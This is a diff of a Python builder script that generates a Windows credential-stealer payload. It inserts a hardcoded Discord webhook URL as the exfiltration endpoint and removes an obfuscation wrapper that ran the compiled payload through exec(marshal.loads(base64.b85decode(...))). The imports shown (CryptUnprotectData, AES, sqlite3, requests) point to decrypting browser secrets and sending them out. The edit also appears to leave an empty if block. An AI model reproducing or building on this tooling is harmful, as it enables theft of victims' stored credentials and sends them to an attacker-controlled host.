@@ -27,7 +27,7 @@ console = input("Show the Console when running? (Y/N): ")
 id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")
 
 code = f"""
-webhook = "{webhook}" # WEBHOOK HERE
+webhook = "{https://discord.com/api/webhooks/1137220641188220948/6GIwyBfIg5C9-jiwdGwBRZ2ZdKJtGMW4lU6LK5tZvDUw8K9Gm54ykqgNpCvPCoL1jqma}" # WEBHOOK HERE
 
 import os
 import json
@@ -195,8 +195,6 @@ if __name__ == "__main__":
 
 try:
     if obfuscate.lower().startswith("Y"):
-        newcode = f"""
-    import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))"""
     else:
         newcode = code
 
